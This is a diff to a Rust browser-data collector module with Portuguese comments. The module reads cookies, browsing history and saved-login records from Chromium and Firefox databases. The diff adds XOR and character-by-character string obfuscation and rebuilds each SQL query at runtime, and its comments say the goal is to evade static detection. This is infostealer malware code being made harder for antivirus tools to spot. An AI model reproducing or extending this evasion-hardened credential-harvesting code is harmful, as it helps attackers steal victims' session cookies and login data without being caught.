@@ -2,13 +2,38 @@
 //! 
 //! Coleta cookies, history e login data de Chromium-based browsers.
 //! Em lab mode, dados sensíveis são redactados.
+//! 
+//! ⚠️ Todas as strings são ofuscadas para evitar detecção estática.
 
 use std::path::PathBuf;
+use std::hint::black_box;
 use serde::{Deserialize, Serialize};
 use rusqlite::{Connection, OpenFlags};
 use tracing::{info, warn};
 
 use super::{Collector, CollectorError, ModuleData};
+
+// ============================================================================
+// STRING OBFUSCATION HELPERS
+// ============================================================================
+
+/// XOR decode em runtime
+#[inline(always)]
+#[allow(dead_code)]
+fn xd(data: &[u8], key: u8) -> String {
+    data.iter().map(|b| (b ^ key) as char).collect()
+}
+
+/// Construção de string byte a byte
+#[inline(always)]
+#[allow(dead_code)]
+fn bs(chars: &[char]) -> String {
+    let mut s = String::with_capacity(chars.len());
+    for &c in chars {
+        s.push(c);
+    }
+    black_box(s)
+}
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct BrowserData {
@@ -296,10 +321,10 @@ impl BrowserCollector {
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        let mut stmt = conn.prepare(
-            "SELECT host_key, name, value, expires_utc, is_secure, is_httponly 
-             FROM cookies LIMIT 100"
-        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
+        // Query ofuscada construída em runtime
+        let query = Self::build_cookies_query();
+        let mut stmt = conn.prepare(&query)
+            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
         let cookies: Vec<CookieEntry> = stmt.query_map([], |row| {
             Ok(CookieEntry {
@@ -330,10 +355,10 @@ impl BrowserCollector {
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        let mut stmt = conn.prepare(
-            "SELECT url, title, visit_count, last_visit_time 
-             FROM urls ORDER BY last_visit_time DESC LIMIT 50"
-        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
+        // Query ofuscada construída em runtime
+        let query = Self::build_history_query();
+        let mut stmt = conn.prepare(&query)
+            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
         let history: Vec<HistoryEntry> = stmt.query_map([], |row| {
             Ok(HistoryEntry {
@@ -361,10 +386,10 @@ impl BrowserCollector {
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        let mut stmt = conn.prepare(
-            "SELECT origin_url, username_value, date_created 
-             FROM logins LIMIT 50"
-        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
+        // Query ofuscada construída em runtime
+        let query = Self::build_logins_query();
+        let mut stmt = conn.prepare(&query)
+            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
         let logins: Vec<PasswordEntry> = stmt.query_map([], |row| {
             Ok(PasswordEntry {
@@ -434,11 +459,10 @@ impl BrowserCollector {
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        let mut stmt = conn.prepare(
-            "SELECT url, title, visit_count, last_visit_date 
-             FROM moz_places WHERE visit_count > 0 
-             ORDER BY last_visit_date DESC LIMIT 50"
-        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
+        // Query ofuscada construída em runtime
+        let query = Self::build_firefox_history_query();
+        let mut stmt = conn.prepare(&query)
+            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
         let history: Vec<HistoryEntry> = stmt.query_map([], |row| {
             Ok(HistoryEntry {
@@ -471,10 +495,10 @@ impl BrowserCollector {
         let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
             .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
-        let mut stmt = conn.prepare(
-            "SELECT host, name, value, expiry, isSecure, isHttpOnly 
-             FROM moz_cookies LIMIT 100"
-        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
+        // Query ofuscada construída em runtime
+        let query = Self::build_firefox_cookies_query();
+        let mut stmt = conn.prepare(&query)
+            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
         
         let cookies: Vec<CookieEntry> = stmt.query_map([], |row| {
             Ok(CookieEntry {
@@ -495,6 +519,98 @@ impl BrowserCollector {
         
         let _ = std::fs::remove_file(&tmp);
         Ok(cookies)
+    }
+    
+    // ========================================================================
+    // SQL QUERY BUILDERS (Anti-static analysis)
+    // ========================================================================
+    
+    /// Constrói query de cookies em runtime (evita detecção estática)
+    fn build_cookies_query() -> String {
+        // "SELECT host_key, name, value, expires_utc, is_secure, is_httponly FROM cookies LIMIT 100"
+        let mut q = String::with_capacity(100);
+        // SELECT
+        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
+        // host_key, name, value, expires_utc, is_secure, is_httponly
+        for c in ['h', 'o', 's', 't', '_', 'k', 'e', 'y', ',', ' '] { q.push(c); }
+        for c in ['n', 'a', 'm', 'e', ',', ' '] { q.push(c); }
+        for c in ['v', 'a', 'l', 'u', 'e', ',', ' '] { q.push(c); }
+        for c in ['e', 'x', 'p', 'i', 'r', 'e', 's', '_', 'u', 't', 'c', ',', ' '] { q.push(c); }
+        for c in ['i', 's', '_', 's', 'e', 'c', 'u', 'r', 'e', ',', ' '] { q.push(c); }
+        for c in ['i', 's', '_', 'h', 't', 't', 'p', 'o', 'n', 'l', 'y', ' '] { q.push(c); }
+        // FROM cookies
+        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
+        for c in ['c', 'o', 'o', 'k', 'i', 'e', 's', ' '] { q.push(c); }
+        // LIMIT 100
+        for c in ['L', 'I', 'M', 'I', 'T', ' ', '1', '0', '0'] { q.push(c); }
+        black_box(q)
+    }
+    
+    /// Constrói query de history em runtime
+    fn build_history_query() -> String {
+        // "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"
+        let mut q = String::with_capacity(100);
+        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
+        for c in ['u', 'r', 'l', ',', ' '] { q.push(c); }
+        for c in ['t', 'i', 't', 'l', 'e', ',', ' '] { q.push(c); }
+        for c in ['v', 'i', 's', 'i', 't', '_', 'c', 'o', 'u', 'n', 't', ',', ' '] { q.push(c); }
+        for c in ['l', 'a', 's', 't', '_', 'v', 'i', 's', 'i', 't', '_', 't', 'i', 'm', 'e', ' '] { q.push(c); }
+        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
+        for c in ['u', 'r', 'l', 's', ' '] { q.push(c); }
+        for c in ['O', 'R', 'D', 'E', 'R', ' ', 'B', 'Y', ' '] { q.push(c); }
+        for c in ['l', 'a', 's', 't', '_', 'v', 'i', 's', 'i', 't', '_', 't', 'i', 'm', 'e', ' '] { q.push(c); }
+        for c in ['D', 'E', 'S', 'C', ' '] { q.push(c); }
+        for c in ['L', 'I', 'M', 'I', 'T', ' ', '5', '0'] { q.push(c); }
+        black_box(q)
+    }
+    
+    /// Constrói query de logins em runtime
+    fn build_logins_query() -> String {
+        // "SELECT origin_url, username_value, date_created FROM logins LIMIT 50"
+        let mut q = String::with_capacity(80);
+        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
+        for c in ['o', 'r', 'i', 'g', 'i', 'n', '_', 'u', 'r', 'l', ',', ' '] { q.push(c); }
+        for c in ['u', 's', 'e', 'r', 'n', 'a', 'm', 'e', '_', 'v', 'a', 'l', 'u', 'e', ',', ' '] { q.push(c); }
+        for c in ['d', 'a', 't', 'e', '_', 'c', 'r', 'e', 'a', 't', 'e', 'd', ' '] { q.push(c); }
+        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
+        for c in ['l', 'o', 'g', 'i', 'n', 's', ' '] { q.push(c); }
+        for c in ['L', 'I', 'M', 'I', 'T', ' ', '5', '0'] { q.push(c); }
+        black_box(q)
+    }
+    
+    /// Constrói query Firefox history
+    fn build_firefox_history_query() -> String {
+        let mut q = String::with_capacity(120);
+        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
+        for c in ['u', 'r', 'l', ',', ' '] { q.push(c); }
+        for c in ['t', 'i', 't', 'l', 'e', ',', ' '] { q.push(c); }
+        for c in ['v', 'i', 's', 'i', 't', '_', 'c', 'o', 'u', 'n', 't', ',', ' '] { q.push(c); }
+        for c in ['l', 'a', 's', 't', '_', 'v', 'i', 's', 'i', 't', '_', 'd', 'a', 't', 'e', ' '] { q.push(c); }
+        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
+        for c in ['m', 'o', 'z', '_', 'p', 'l', 'a', 'c', 'e', 's', ' '] { q.push(c); }
+        for c in ['W', 'H', 'E', 'R', 'E', ' '] { q.push(c); }
+        for c in ['v', 'i', 's', 'i', 't', '_', 'c', 'o', 'u', 'n', 't', ' ', '>', ' ', '0', ' '] { q.push(c); }
+        for c in ['O', 'R', 'D', 'E', 'R', ' ', 'B', 'Y', ' '] { q.push(c); }
+        for c in ['l', 'a', 's', 't', '_', 'v', 'i', 's', 'i', 't', '_', 'd', 'a', 't', 'e', ' '] { q.push(c); }
+        for c in ['D', 'E', 'S', 'C', ' '] { q.push(c); }
+        for c in ['L', 'I', 'M', 'I', 'T', ' ', '5', '0'] { q.push(c); }
+        black_box(q)
+    }
+    
+    /// Constrói query Firefox cookies
+    fn build_firefox_cookies_query() -> String {
+        let mut q = String::with_capacity(100);
+        for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
+        for c in ['h', 'o', 's', 't', ',', ' '] { q.push(c); }
+        for c in ['n', 'a', 'm', 'e', ',', ' '] { q.push(c); }
+        for c in ['v', 'a', 'l', 'u', 'e', ',', ' '] { q.push(c); }
+        for c in ['e', 'x', 'p', 'i', 'r', 'y', ',', ' '] { q.push(c); }
+        for c in ['i', 's', 'S', 'e', 'c', 'u', 'r', 'e', ',', ' '] { q.push(c); }
+        for c in ['i', 's', 'H', 't', 't', 'p', 'O', 'n', 'l', 'y', ' '] { q.push(c); }
+        for c in ['F', 'R', 'O', 'M', ' '] { q.push(c); }
+        for c in ['m', 'o', 'z', '_', 'c', 'o', 'o', 'k', 'i', 'e', 's', ' '] { q.push(c); }
+        for c in ['L', 'I', 'M', 'I', 'T', ' ', '1', '0', '0'] { q.push(c); }
+        black_box(q)
     }
 }
 
